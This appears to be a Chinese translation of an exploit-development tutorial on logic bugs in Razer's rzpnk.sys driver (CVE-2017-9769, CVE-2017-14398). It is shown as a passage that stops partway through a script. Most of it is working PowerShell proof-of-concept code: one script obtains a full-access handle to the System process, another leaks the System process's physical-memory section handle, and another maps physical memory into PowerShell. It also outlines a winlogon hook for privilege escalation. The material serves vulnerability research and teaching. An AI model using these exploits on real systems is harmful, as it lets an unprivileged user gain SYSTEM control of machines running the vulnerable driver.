---
title: Windows exploit系列教程第十九篇：内核利用程序之Razer rzpnk.sys中的逻辑bug
date: 2018-03-19 19:27:11
categories: exploit
tags:
	- windows
	- novice
---
fuzzySecurity于16年更新了数篇Windows内核exp的教程，本文是内核篇的第十篇，也是目前为止的最后一篇。[点击查看原文](http://fuzzysecurity.com/tutorials/expDev/23.html)。

<!--more-->

# 内核利用程序之Razer rzpnk.sys中的逻辑bug

欢迎回到另一个Windows内核exp开发系列教程！今天我们看些不同寻常的东西。不久前[@zeroSteiner](https://twitter.com/zeroSteiner) 在rzpnk.sys中挖掘出了两个bug([CVE-2017-9770](https://warroom.securestate.com/cve-2017-9770/) & [CVE-2017-9769](https://warroom.securestate.com/cve-2017-9769/))，该驱动由Razer Synapse所用。此后不久我决定看看这两个bug并且。。。我还发现了可以本地提权的另外一个逻辑bug([CVE-2017-14398](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14398))！

本文我们将简要的阐述 CVE-2017-9769，此后我们会针对我发现的bug CVE-2017-14398写一个exp。开始之前我想大声疾呼 [@aionescu](https://twitter.com/aionescu)，他总是说我根本不知道我在做什么，但这一次我可以挺直腰板了！我也曾一度在玩Binary Ninja，截图就是从那里获取的，如果有人对此感兴趣的话。

**Resources:**

+ Razer Rzpnk.Sys IOCTL 0x226048 OOB Read (CVE-2017-9770) ([@zeroSteiner](https://twitter.com/zeroSteiner)) - [here](https://warroom.securestate.com/cve-2017-9770/)
+ Razer Rzpnk.Sys IOCTL 0x22a050 ZwOpenProcess (CVE-2017-9769) ([@zeroSteiner](https://twitter.com/zeroSteiner)) - [here](https://warroom.securestate.com/cve-2017-9769/)
+ MSI ntiolib.sys/winio.sys local privilege escalation ([@rwfpl](https://twitter.com/rwfpl)) - [here](http://blog.rewolf.pl/blog/?p=1630)



##永不屈服

在开始之前我想先快速的展示一下，这些漏洞函数在调用图示上有多么的接近。对于分发函数来说，它们字面上是相邻的。

![](/images/exploit/fuzzySecurity/20180316_13.jpg)

这些调用分支源于上面同一个决策点，我们可以看到它从IOCTL中减掉了0x10，当该值是0的时候，就跳转到ZwOpenProcess调用处，如果值为0x14的话，就跳转到ZwMapViewOfSection调用处。

同时注意到该驱动会检查输入和输出缓冲区的尺寸，如果提供的输入参数不够或输出缓冲区不够大的话，分支会落入失败的情景。

## ZwOpenProcess POC (CVE-2017-9769)

![](/images/exploit/fuzzySecurity/20180316_14.jpg)

我们不会在该函数上浪费太多时间，该漏洞很容易被证明。我们知道函数需要两个QWORD作为输入参数，从Spencer的exp中可以看到他pack了一个pid和null作为QWORD。我们可以用下面的POC快速复制。

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class Razer
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
   
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        IntPtr OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);
 
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        UInt32 flAllocationType,
        UInt32 flProtect);
}
"@
 
#----------------[Get Driver Handle]
 
$hDevice = [Razer]::CreateFile("\\.\47CD78C9-64C3-47C2-B80F-677B887CF095", [System.IO.FileAccess]::ReadWrite,
[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
 
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver access OK.."
    echo "[+] lpFileName: \\.\47CD78C9-64C3-47C2-B80F-677B887CF095 => rzpnk"
    echo "[+] Handle: $hDevice"
}
 
#----------------[Prepare buffer & Send IOCTL]
 
# Input buffer
$InBuffer = @(
    [System.BitConverter]::GetBytes([Int64]0x4) + # PID 4 = System = 0x0000000000000004
    [System.BitConverter]::GetBytes([Int64]0x0)   # 0x0000000000000000
)
 
# Output buffer 1kb
$OutBuffer = [Razer]::VirtualAlloc([System.IntPtr]::Zero, 1024, 0x3000, 0x40)
 
# Ptr receiving output byte count
$IntRet = 0
 
#=======
# 0x22a050 - ZwOpenProcess
#=======
$CallResult = [Razer]::DeviceIoControl($hDevice, 0x22a050, $InBuffer, $InBuffer.Length, $OutBuffer, 1024, [ref]$IntRet, [System.IntPtr]::Zero)
if (!$CallResult) {
    echo "`n[!] DeviceIoControl failed..`n"
    Return
}
 
#----------------[Read out the result buffer]
echo "`n[>] Call result:"
"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()))
"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8))
```

运行POC，得到下面的输出。

![](/images/exploit/fuzzySecurity/20180316_15.jpg)

如果我们查看返回的两个QWORD值的话就会发现，第一个是我们传入的PID值，而第二个是一个句柄。当我们在PowerShell进程中查看返回的句柄时，可以看到如下的内容。

![](/images/exploit/fuzzySecurity/20180316_16.jpg)

游戏也就通关了，我们有一个对System pid完全访问权限的句柄，这意味着我们可以从该进程空间中任意读写。Spencer的exp中的方法起始就是：

1. 获取一个到winlogon的句柄
2. hook user32!LockWorkStation，钩住我们的shellcode
3. 锁住用户会话
4. 利用

## Exploiting ZwMapViewOfSection (CVE-2017-14398)

是时候上点好东西了！我强烈推荐你先看看 [@rwfpl](https://twitter.com/rwfpl)的文章来了解一下该bug类型的背景知识，ntiolib/winio exp在这里 [here](http://blog.rewolf.pl/blog/?p=1630)。

![](/images/exploit/fuzzySecurity/20180316_17.jpg)

记住在第一个截图中函数期望一个0x30尺寸的输入（6个QWORD），同时输出也是0x30大小。我们可以快速创建一个POC来访问到漏洞函数。

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class Razer
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
   
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        IntPtr OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);
 
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        UInt32 flAllocationType,
        UInt32 flProtect);
}
"@
 
#----------------[Get Driver Handle]
 
$hDevice = [Razer]::CreateFile("\\.\47CD78C9-64C3-47C2-B80F-677B887CF095", [System.IO.FileAccess]::ReadWrite,
[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
 
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver access OK.."
    echo "[+] lpFileName: \\.\47CD78C9-64C3-47C2-B80F-677B887CF095 => rzpnk"
    echo "[+] Handle: $hDevice"
}
 
#----------------[Prepare buffer & Send IOCTL]
 
# Input buffer
$InBuffer = @(
    [System.BitConverter]::GetBytes([Int64]0xAAAAAA) +
    [System.BitConverter]::GetBytes([Int64]0xBBBBBB) +
    [System.BitConverter]::GetBytes([Int64]0xCCCCCC) +
    [System.BitConverter]::GetBytes([Int64]0xDDDDDD) +
    [System.BitConverter]::GetBytes([Int64]0xEEEEEE) +
    [System.BitConverter]::GetBytes([Int64]0xFFFFFF)
)
 
# Output buffer
$OutBuffer = [Razer]::VirtualAlloc([System.IntPtr]::Zero, 1024, 0x3000, 0x40)
 
# Ptr receiving output byte count
$IntRet = 0
 
#=======
# 0x22A064 - ZwMapViewOfSection
#=======
$CallResult = [Razer]::DeviceIoControl($hDevice, 0x22A064, $InBuffer, $InBuffer.Length, $OutBuffer, 1024, [ref]$IntRet, [System.IntPtr]::Zero)
if (!$CallResult) {
    echo "`n[!] DeviceIoControl failed..`n"
    Return
}
 
#----------------[Read out the result buffer]
echo "`n[>] Call result:"
"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64())) # 0x30 pyramid scheme ;)
"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8))
"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8))
"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8))
"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8+8))
"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8+8+8))
```

在做调试之前，我们先运行POc并看看驱动返回了什么。

![](/images/exploit/fuzzySecurity/20180316_18.jpg)

很好，附加了一串输入参数后我们可以看到Int64返回了0，低序DWORD返回了[NTSTATUS code](https://msdn.microsoft.com/en-us/library/cc704588.aspx)。这种情况下， [ZwMapViewOfSection](https://msdn.microsoft.com/en-us/library/windows/hardware/ff566481%28v=vs.85%29.aspx)返回了 STATUS_INVALID_HANDLE ，它表示函数期望一个区段句柄作为第一个参数，而我们却填充了一些垃圾值。另一方面的影响在于我们可以通过对比NTSTATUS码0x0（STATUS_SUCCESS）来鉴别调用是否成功。

图中可以看到我们已经知道了一些静态参数的值，为了消除疑惑我们在调用ZwMapViewOfSection调用处下个断点，检查寄存器和堆栈。ZwMapViewOfSection使用stdcall标准，因此，参数会被存储在RCX,RDX,R8,R9以及栈上。

![](/images/exploit/fuzzySecurity/20180316_19.jpg)

把这些全部放在我们的输入参数中，得到下面的内容。

```
NTSTATUS ZwMapViewOfSection(
  _In_        HANDLE          SectionHandle,      | Param 3 - RCX = SectionHandle
  _In_        HANDLE          ProcessHandle,      | Param 1 - RDX = ProcessHandle
  _Inout_     PVOID           *BaseAddress,       | Param 2 - R8  = BaseAddress -> Irrelevant, ptr to NULL
  _In_        ULONG_PTR       ZeroBits,           | 0 -> OK - R9
  _In_        SIZE_T          CommitSize,         | Param 5 - CommitSize / ViewSize
  _Inout_opt_ PLARGE_INTEGER  SectionOffset,      | 0 -> OK
  _Inout_     PSIZE_T         ViewSize,           | Param 5 - CommitSize / ViewSize
  _In_        SECTION_INHERIT InheritDisposition, | 2 = ViewUnmap
  _In_        ULONG           AllocationType,     | 0 -> Undocumented?
  _In_        ULONG           Win32Protect        | 0x40 -> PAGE_READWRITE
);
```

这里我们大部分能控制的都很直接。进程句柄的话我们仅仅需要传递一个到Powershell有完整权限的句柄，提交尺寸/视图尺寸则很简单，就是我们映射到进程的大小。但还是有个问题，我们要如何得到一个区段句柄，驱动并没有任何的函数允许我们去调用ZwCreateSection或ZwOpenSection。

**Leaking Physical Memory**

在这一点上我甚是迷惑，由于我无法创建一个区段句柄，exp也就到此为止了。幸运的是[@aionescu](https://twitter.com/aionescu) 给了我一些灵感。使用NtQuerySystemInformation并携带SystemHandleInformation类别参数我们可以泄露出系统上通过进程打开的所有句柄。这些句柄是每-进程用户空间句柄，然而，System进程(PID=4)是一个特殊的例子，它允许我们转换用户空间句柄成内核句柄！

我为什么要关心这些？实际上System有一个到"\Device\PhysicalMemory"的句柄，如果我们可以泄露出该句柄的话，就可以利用ZwMapViewOfSection来直接映射物理内存到我们的PowerShel进程了！

![](/images/exploit/fuzzySecurity/20180316_20.jpg)

我写了一个powershell函数来实现这个功能。它使用静态的句柄常量来判断进程打开的句柄类型。我近期更新了这个函数，它现在可以在Win 7到Win 10 RS2上工作。 [Get-Handles](https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Get-Handles.ps1)是我GitHub上的 [PSKernel-Primitives](https://github.com/FuzzySecurity/PSKernel-Primitives) repo的一部分，如果你想要利用PowerShell做内核pwn的话，可以使用它。

![](/images/exploit/fuzzySecurity/20180316_21.jpg)

获取内核句柄所需要做的就是把一个静态值与0x204（64位：0xffffffff80000000，32位：0x80000000）做加法运算。我们可以动态的做这件事。

```powershell
$SystemProcHandles = Get-Handles -ProcID 4
[Int]$UserSectionHandle = $(($SystemProcHandles |Where-Object {$_.ObjectType -eq "Section"}).Handle)
[Int64]$SystemSectionHandle = $UserSectionHandle + 0xffffffff80000000
```

现在我们可以把所有东西整合一下，写一个新POC。为了测试起见，我们尝试去映射1mb的物理内存到PowerShell。

```powershell
function RZ-ZwMapViewOfSection {
    Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security.Principal;
     
    public static class Razer
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateFile(
            String lpFileName,
            UInt32 dwDesiredAccess,
            UInt32 dwShareMode,
            IntPtr lpSecurityAttributes,
            UInt32 dwCreationDisposition,
            UInt32 dwFlagsAndAttributes,
            IntPtr hTemplateFile);
     
        [DllImport("Kernel32.dll", SetLastError = true)]
        public static extern bool DeviceIoControl(
            IntPtr hDevice,
            int IoControlCode,
            byte[] InBuffer,
            int nInBufferSize,
            IntPtr OutBuffer,
            int nOutBufferSize,
            ref int pBytesReturned,
            IntPtr Overlapped);
     
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect);
     
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(
            UInt32 processAccess,
            bool bInheritHandle,
            int processId);
    }
"@
 
    #----------------[Helper Funcs]
    function Get-Handles {
    <#
    .SYNOPSIS
        Use NtQuerySystemInformation::SystemHandleInformation to get a list of
        open handles in the specified process, works on x32/x64.
        Notes:
     
        * For more robust coding I would recomend using @mattifestation's
        Get-NtSystemInformation.ps1 part of PowerShellArsenal.
     
    .DESCRIPTION
        Author: Ruben Boonen (@FuzzySec)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
     
    .EXAMPLE
        C:\PS> $SystemProcHandles = Get-Handles -ProcID 4
        C:\PS> $Key = $SystemProcHandles |Where-Object {$_.ObjectType -eq "Key"}
        C:\PS> $Key |ft
     
        ObjectType AccessMask PID Handle HandleFlags KernelPointer
        ---------- ---------- --- ------ ----------- -------------
        Key        0x00000000   4 0x004C NONE        0xFFFFC9076FC29BC0
        Key        0x00020000   4 0x0054 NONE        0xFFFFC9076FCDA7F0
        Key        0x000F0000   4 0x0058 NONE        0xFFFFC9076FC39CE0
        Key        0x00000000   4 0x0090 NONE        0xFFFFC907700A6B40
        Key        0x00000000   4 0x0098 NONE        0xFFFFC90770029F70
        Key        0x00020000   4 0x00A0 NONE        0xFFFFC9076FC9C1A0
        [...Snip...]
    #>
     
        [CmdletBinding()]
        param (
            [Parameter(Mandatory = $True)]
            [int]$ProcID
        )
         
        Add-Type -TypeDefinition @"
        using System;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
        using System.Security.Principal;
         
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct SYSTEM_HANDLE_INFORMATION
        {
            public UInt32 ProcessID;
            public Byte ObjectTypeNumber;
            public Byte Flags;
            public UInt16 HandleValue;
            public IntPtr Object_Pointer;
            public UInt32 GrantedAccess;
        }
         
        public static class GetHandles
        {
            [DllImport("ntdll.dll")]
            public static extern int NtQuerySystemInformation(
                int SystemInformationClass,
                IntPtr SystemInformation,
                int SystemInformationLength,
                ref int ReturnLength);
        }
"@
     
        # Make sure the PID exists
        if (!$(get-process -Id $ProcID -ErrorAction SilentlyContinue)) {
            Return
        }
     
        # Flag switches (0 = NONE?)
        $FlagSwitches = @{
            0 = 'NONE'
            1 = 'PROTECT_FROM_CLOSE'
            2 = 'INHERIT'
        }
         
        $OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
        $OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
        switch ($OSMajorMinor)
        {
            '10.0' # Windows 10 (Tested on v1511)
            {
                # Win 10 v1703
                if ($OSVersion.Build -ge 15063) {
                    $TypeSwitches = @{
                        0x24 = 'TmTm'; 0x18 = 'Desktop'; 0x7 = 'Process'; 0x2c = 'RegistryTransaction'; 0xe = 'DebugObject';
                        0x3d = 'VRegConfigurationContext'; 0x34 = 'DmaDomain'; 0x1c = 'TpWorkerFactory'; 0x1d = 'Adapter';
                        0x5 = 'Token'; 0x39 = 'DxgkSharedResource'; 0xc = 'PsSiloContextPaged'; 0x38 = 'NdisCmState';
                        0xb = 'ActivityReference'; 0x35 = 'PcwObject'; 0x2f = 'WmiGuid'; 0x33 = 'DmaAdapter';
                        0x30 = 'EtwRegistration'; 0x29 = 'Session'; 0x1a = 'RawInputManager'; 0x13 = 'Timer'; 0x10 = 'Mutant';
                        0x14 = 'IRTimer'; 0x3c = 'DxgkCurrentDxgProcessObject'; 0x21 = 'IoCompletion';
                        0x3a = 'DxgkSharedSyncObject'; 0x17 = 'WindowStation'; 0x15 = 'Profile'; 0x23 = 'File';
                        0x2a = 'Partition'; 0x12 = 'Semaphore'; 0xd = 'PsSiloContextNonPaged'; 0x32 = 'EtwConsumer';
                        0x19 = 'Composition'; 0x31 = 'EtwSessionDemuxEntry'; 0x1b = 'CoreMessaging'; 0x25 = 'TmTx';
                        0x4 = 'SymbolicLink'; 0x36 = 'FilterConnectionPort'; 0x2b = 'Key'; 0x16 = 'KeyedEvent';
                        0x11 = 'Callback'; 0x22 = 'WaitCompletionPacket'; 0x9 = 'UserApcReserve'; 0x6 = 'Job';
                        0x3b = 'DxgkSharedSwapChainObject'; 0x1e = 'Controller'; 0xa = 'IoCompletionReserve'; 0x1f = 'Device';
                        0x3 = 'Directory'; 0x28 = 'Section'; 0x27 = 'TmEn'; 0x8 = 'Thread'; 0x2 = 'Type';
                        0x37 = 'FilterCommunicationPort'; 0x2e = 'PowerRequest'; 0x26 = 'TmRm'; 0xf = 'Event';
                        0x2d = 'ALPC Port'; 0x20 = 'Driver';
                    }
                }
                 
                # Win 10 v1607
                if ($OSVersion.Build -ge 14393 -And $OSVersion.Build -lt 15063) {
                    $TypeSwitches = @{
                        0x23 = 'TmTm'; 0x17 = 'Desktop'; 0x7 = 'Process'; 0x2b = 'RegistryTransaction'; 0xd = 'DebugObject';
                        0x3a = 'VRegConfigurationContext'; 0x32 = 'DmaDomain'; 0x1b = 'TpWorkerFactory'; 0x1c = 'Adapter';
                        0x5 = 'Token'; 0x37 = 'DxgkSharedResource'; 0xb = 'PsSiloContextPaged'; 0x36 = 'NdisCmState';
                        0x33 = 'PcwObject'; 0x2e = 'WmiGuid'; 0x31 = 'DmaAdapter'; 0x2f = 'EtwRegistration';
                        0x28 = 'Session'; 0x19 = 'RawInputManager'; 0x12 = 'Timer'; 0xf = 'Mutant'; 0x13 = 'IRTimer';
                        0x20 = 'IoCompletion'; 0x38 = 'DxgkSharedSyncObject'; 0x16 = 'WindowStation'; 0x14 = 'Profile';
                        0x22 = 'File'; 0x3b = 'VirtualKey'; 0x29 = 'Partition'; 0x11 = 'Semaphore'; 0xc = 'PsSiloContextNonPaged';
                        0x30 = 'EtwConsumer'; 0x18 = 'Composition'; 0x1a = 'CoreMessaging'; 0x24 = 'TmTx'; 0x4 = 'SymbolicLink';
                        0x34 = 'FilterConnectionPort'; 0x2a = 'Key'; 0x15 = 'KeyedEvent'; 0x10 = 'Callback';
                        0x21 = 'WaitCompletionPacket'; 0x9 = 'UserApcReserve'; 0x6 = 'Job'; 0x39 = 'DxgkSharedSwapChainObject';
                        0x1d = 'Controller'; 0xa = 'IoCompletionReserve'; 0x1e = 'Device'; 0x3 = 'Directory'; 0x27 = 'Section';
                        0x26 = 'TmEn'; 0x8 = 'Thread'; 0x2 = 'Type'; 0x35 = 'FilterCommunicationPort'; 0x2d = 'PowerRequest';
                        0x25 = 'TmRm'; 0xe = 'Event'; 0x2c = 'ALPC Port'; 0x1f = 'Driver';
                    }
                }
                 
                # Win 10 v1511
                if ($OSVersion.Build -lt 14393) {
                    $TypeSwitches = @{
                        0x02 = 'Type'; 0x03 = 'Directory'; 0x04 = 'SymbolicLink'; 0x05 = 'Token'; 0x06 = 'Job';
                        0x07 = 'Process'; 0x08 = 'Thread'; 0x09 = 'UserApcReserve'; 0x0A = 'IoCompletionReserve';
                        0x0B = 'DebugObject'; 0x0C = 'Event'; 0x0D = 'Mutant'; 0x0E = 'Callback'; 0x0F = 'Semaphore';
                        0x10 = 'Timer'; 0x11 = 'IRTimer'; 0x12 = 'Profile'; 0x13 = 'KeyedEvent'; 0x14 = 'WindowStation';
                        0x15 = 'Desktop'; 0x16 = 'Composition'; 0x17 = 'RawInputManager'; 0x18 = 'TpWorkerFactory';
                        0x19 = 'Adapter'; 0x1A = 'Controller'; 0x1B = 'Device'; 0x1C = 'Driver'; 0x1D = 'IoCompletion';
                        0x1E = 'WaitCompletionPacket'; 0x1F = 'File'; 0x20 = 'TmTm'; 0x21 = 'TmTx'; 0x22 = 'TmRm';
                        0x23 = 'TmEn'; 0x24 = 'Section'; 0x25 = 'Session'; 0x26 = 'Partition'; 0x27 = 'Key';
                        0x28 = 'ALPC Port'; 0x29 = 'PowerRequest'; 0x2A = 'WmiGuid'; 0x2B = 'EtwRegistration';
                        0x2C = 'EtwConsumer'; 0x2D = 'DmaAdapter'; 0x2E = 'DmaDomain'; 0x2F = 'PcwObject';
                        0x30 = 'FilterConnectionPort'; 0x31 = 'FilterCommunicationPort'; 0x32 = 'NetworkNamespace';
                        0x33 = 'DxgkSharedResource'; 0x34 = 'DxgkSharedSyncObject'; 0x35 = 'DxgkSharedSwapChainObject';
                    }
                }
            }
             
            '6.2' # Windows 8 and Windows Server 2012
            {
                $TypeSwitches = @{
                    0x02 = 'Type'; 0x03 = 'Directory'; 0x04 = 'SymbolicLink'; 0x05 = 'Token'; 0x06 = 'Job';
                    0x07 = 'Process'; 0x08 = 'Thread'; 0x09 = 'UserApcReserve'; 0x0A = 'IoCompletionReserve';
                    0x0B = 'DebugObject'; 0x0C = 'Event'; 0x0D = 'EventPair'; 0x0E = 'Mutant'; 0x0F = 'Callback';
                    0x10 = 'Semaphore'; 0x11 = 'Timer'; 0x12 = 'IRTimer'; 0x13 = 'Profile'; 0x14 = 'KeyedEvent';
                    0x15 = 'WindowStation'; 0x16 = 'Desktop'; 0x17 = 'CompositionSurface'; 0x18 = 'TpWorkerFactory';
                    0x19 = 'Adapter'; 0x1A = 'Controller'; 0x1B = 'Device'; 0x1C = 'Driver'; 0x1D = 'IoCompletion';
                    0x1E = 'WaitCompletionPacket'; 0x1F = 'File'; 0x20 = 'TmTm'; 0x21 = 'TmTx'; 0x22 = 'TmRm';
                    0x23 = 'TmEn'; 0x24 = 'Section'; 0x25 = 'Session'; 0x26 = 'Key'; 0x27 = 'ALPC Port';
                    0x28 = 'PowerRequest'; 0x29 = 'WmiGuid'; 0x2A = 'EtwRegistration'; 0x2B = 'EtwConsumer';
                    0x2C = 'FilterConnectionPort'; 0x2D = 'FilterCommunicationPort'; 0x2E = 'PcwObject';
                    0x2F = 'DxgkSharedResource'; 0x30 = 'DxgkSharedSyncObject';
                }
            }
         
            '6.1' # Windows 7 and Window Server 2008 R2
            {
                $TypeSwitches = @{
                    0x02 = 'Type'; 0x03 = 'Directory'; 0x04 = 'SymbolicLink'; 0x05 = 'Token'; 0x06 = 'Job';
                    0x07 = 'Process'; 0x08 = 'Thread'; 0x09 = 'UserApcReserve'; 0x0a = 'IoCompletionReserve';
                    0x0b = 'DebugObject'; 0x0c = 'Event'; 0x0d = 'EventPair'; 0x0e = 'Mutant'; 0x0f = 'Callback';
                    0x10 = 'Semaphore'; 0x11 = 'Timer'; 0x12 = 'Profile'; 0x13 = 'KeyedEvent'; 0x14 = 'WindowStation';
                    0x15 = 'Desktop'; 0x16 = 'TpWorkerFactory'; 0x17 = 'Adapter'; 0x18 = 'Controller';
                    0x19 = 'Device'; 0x1a = 'Driver'; 0x1b = 'IoCompletion'; 0x1c = 'File'; 0x1d = 'TmTm';
                    0x1e = 'TmTx'; 0x1f = 'TmRm'; 0x20 = 'TmEn'; 0x21 = 'Section'; 0x22 = 'Session'; 0x23 = 'Key';
                    0x24 = 'ALPC Port'; 0x25 = 'PowerRequest'; 0x26 = 'WmiGuid'; 0x27 = 'EtwRegistration';
                    0x28 = 'EtwConsumer'; 0x29 = 'FilterConnectionPort'; 0x2a = 'FilterCommunicationPort';
                    0x2b = 'PcwObject';
                }
            }
         
            '6.0' # Windows Vista and Windows Server 2008
            {
                $TypeSwitches = @{
                    0x01 = 'Type'; 0x02 = 'Directory'; 0x03 = 'SymbolicLink'; 0x04 = 'Token'; 0x05 = 'Job';
                    0x06 = 'Process'; 0x07 = 'Thread'; 0x08 = 'DebugObject'; 0x09 = 'Event'; 0x0a = 'EventPair';
                    0x0b = 'Mutant'; 0x0c = 'Callback'; 0x0d = 'Semaphore'; 0x0e = 'Timer'; 0x0f = 'Profile';
                    0x10 = 'KeyedEvent'; 0x11 = 'WindowStation'; 0x12 = 'Desktop'; 0x13 = 'TpWorkerFactory';
                    0x14 = 'Adapter'; 0x15 = 'Controller'; 0x16 = 'Device'; 0x17 = 'Driver'; 0x18 = 'IoCompletion';
                    0x19 = 'File'; 0x1a = 'TmTm'; 0x1b = 'TmTx'; 0x1c = 'TmRm'; 0x1d = 'TmEn'; 0x1e = 'Section';
                    0x1f = 'Session'; 0x20 = 'Key'; 0x21 = 'ALPC Port'; 0x22 = 'WmiGuid'; 0x23 = 'EtwRegistration';
                    0x24 = 'FilterConnectionPort'; 0x25 = 'FilterCommunicationPort';
                }
            }
        }
     
        [int]$BuffPtr_Size = 0
        while ($true) {
            [IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
            $SystemInformationLength = New-Object Int
         
            $CallResult = [GetHandles]::NtQuerySystemInformation(16, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
             
            # STATUS_INFO_LENGTH_MISMATCH
            if ($CallResult -eq 0xC0000004) {
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
                [int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
            }
            # STATUS_SUCCESS
            elseif ($CallResult -eq 0x00000000) {
                break
            }
            # Probably: 0xC0000005 -> STATUS_ACCESS_VIOLATION
            else {
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
                return
            }
        }
         
        $SYSTEM_HANDLE_INFORMATION = New-Object SYSTEM_HANDLE_INFORMATION
        $SYSTEM_HANDLE_INFORMATION = $SYSTEM_HANDLE_INFORMATION.GetType()
        if ([System.IntPtr]::Size -eq 4) {
            $SYSTEM_HANDLE_INFORMATION_Size = 16 # This makes sense!
        } else {
            $SYSTEM_HANDLE_INFORMATION_Size = 24 # This doesn't make sense, should be 20 on x64 but that doesn't work.
                                                # Ask no questions, hear no lies!
        }
         
        $BuffOffset = $BuffPtr.ToInt64()
        $HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
        $BuffOffset = $BuffOffset + [System.IntPtr]::Size
         
        $SystemHandleArray = @()
        for ($i=0; $i -lt $HandleCount; $i++){
            # PtrToStructure only objects we are targeting, this is expensive computation
            if ([System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset) -eq $ProcID) {
                $SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
                $Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_HANDLE_INFORMATION)
                 
                $HashTable = @{
                    PID = $Cast.ProcessID
                    ObjectType = if (!$($TypeSwitches[[int]$Cast.ObjectTypeNumber])) { "0x$('{0:X2}' -f [int]$Cast.ObjectTypeNumber)" } else { $TypeSwitches[[int]$Cast.ObjectTypeNumber] }
                    HandleFlags = $FlagSwitches[[int]$Cast.Flags]
                    Handle = "0x$('{0:X4}' -f [int]$Cast.HandleValue)"
                    KernelPointer = if ([System.IntPtr]::Size -eq 4) { "0x$('{0:X}' -f $Cast.Object_Pointer.ToInt32())" } else { "0x$('{0:X}' -f $Cast.Object_Pointer.ToInt64())" }
                    AccessMask = "0x$('{0:X8}' -f $($Cast.GrantedAccess -band 0xFFFF0000))"
                }
                 
                $Object = New-Object PSObject -Property $HashTable
                $SystemHandleArray += $Object
                 
            }
     
            $BuffOffset = $BuffOffset + $SYSTEM_HANDLE_INFORMATION_Size
        }
         
        if ($($SystemHandleArray.count) -eq 0) {
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
            Return
        }
         
        # Set column order and auto size
        $SystemHandleArray
         
        # Free SYSTEM_HANDLE_INFORMATION array
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
    }
 
    #----------------[Get Driver Handle]
     
    $hDevice = [Razer]::CreateFile("\\.\47CD78C9-64C3-47C2-B80F-677B887CF095", [System.IO.FileAccess]::ReadWrite,
    [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
     
    if ($hDevice -eq -1) {
